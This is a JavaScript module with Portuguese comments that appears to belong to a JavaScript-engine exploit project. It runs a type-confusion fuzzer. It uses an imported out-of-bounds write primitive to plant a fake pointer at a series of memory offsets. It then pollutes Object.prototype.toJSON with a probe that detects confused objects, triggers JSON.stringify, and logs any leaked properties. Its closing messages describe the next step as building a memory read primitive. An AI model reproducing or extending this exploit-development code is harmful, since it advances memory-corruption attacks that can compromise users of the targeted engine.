// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: FUZZER DE TYPE CONFUSION)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração do Fuzzer ---
const FUZZER_CONFIG = {
    // Lista de offsets para testar a corrupção.
    corruption_offsets: [0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0],
    
    // Ponteiro falso que sabemos que não causa crash.
    FAKE_POINTER: new AdvancedInt64("0x0108230700001337"),
};
// --- Fim dos Parâmetros ---

let success_offset = -1;

function build_stack_and_trigger(depth, victim_obj) {
    if (depth <= 0) {
        try {
            JSON.stringify(victim_obj);
        } catch(e) {
            // Ignoramos erros aqui, pois a detecção será feita no 'toJSON'.
        }
        return;
    }
    build_stack_and_trigger(depth - 1, victim_obj);
}

export async function testAddrofPrimitive() {
    const FNAME = "testTypeConfusionFuzzer";
    logS3(`--- Iniciando Fuzzer de Type Confusion com Sonda Diagnóstica ---`, "test", FNAME);

    // Itera sobre cada offset candidato
    for (const offset of FUZZER_CONFIG.corruption_offsets) {
        if (success_offset !== -1) break;

        logS3(`\n>>> Testando Offset: ${toHex(offset)}`, "info", FNAME);
        await triggerOOB_primitive();

        const victim = { test_id: offset };
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        // Etapa 1: Poluir toJSON com nossa nova e poderosa sonda de diagnóstico.
        Object.defineProperty(Object.prototype, ppKey, {
            value: function() {
                const this_type = Object.prototype.toString.call(this);
                // Se 'this' não for o nosso objeto 'victim' original, encontramos uma confusão!
                if (!this.hasOwnProperty('test_id')) {
                    logS3(`[SONDA] TYPE CONFUSION DETECTADA no offset ${toHex(offset)}!`, "vuln", FNAME);
                    logS3(`  -> 'this' é do tipo: ${this_type}`, "leak", FNAME);
                    
                    // Tenta acessar propriedades de diferentes tipos de objeto
                    try { logS3(`  -> Tentando ler 'this.byteLength': ${this.byteLength}`, "leak", FNAME); } catch (e) {}
                    try { logS3(`  -> Tentando ler 'this.length': ${this.length}`, "leak", FNAME); } catch (e) {}
                    try { logS3(`  -> Tentando ler 'this.callee': ${this.callee}`, "leak", FNAME); } catch (e) {}
                    
                    success_offset = offset;
                }
                return this; // Retorna o próprio objeto para evitar mais processamento
            },
            writable: true, configurable: true, enumerable: false
        });

        // Etapa 2: Realizar a corrupção no offset atual
        try {
            oob_write_absolute(offset, FUZZER_CONFIG.FAKE_POINTER, 8);
        } catch (e) {
            logS3(`Falha ao escrever OOB no offset ${toHex(offset)}: ${e.message}`, "error", FNAME);
            continue; // Pula para o próximo offset
        }
        
        await PAUSE_S3(50);

        // Etapa 3: Construir a pilha e acionar o gatilho
        build_stack_and_trigger(20, victim);

        // Limpeza para a próxima iteração do loop
        if (originalToJSONDescriptor) {
            Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
        } else {
            delete Object.prototype[ppKey];
        }
        clearOOBEnvironment();
        await PAUSE_S3(50);
    }
    
    // Relatório Final
    if (success_offset !== -1) {
        logS3(`--- SUCESSO! Vulnerabilidade de Type Confusion confirmada no offset: ${toHex(success_offset)} ---`, "vuln", FNAME);
        logS3("   O próximo passo é analisar as propriedades vazadas nesse offset para construir a primitiva de leitura.", "info", FNAME);
    } else {
        logS3("--- Fuzzer concluído. Nenhum offset causou uma confusão de tipos óbvia. ---", "warn", FNAME);
        logS3("   Pode ser necessário expandir a lista de offsets ou analisar o disassembly para encontrar alvos melhores.", "info", FNAME);
    }
}
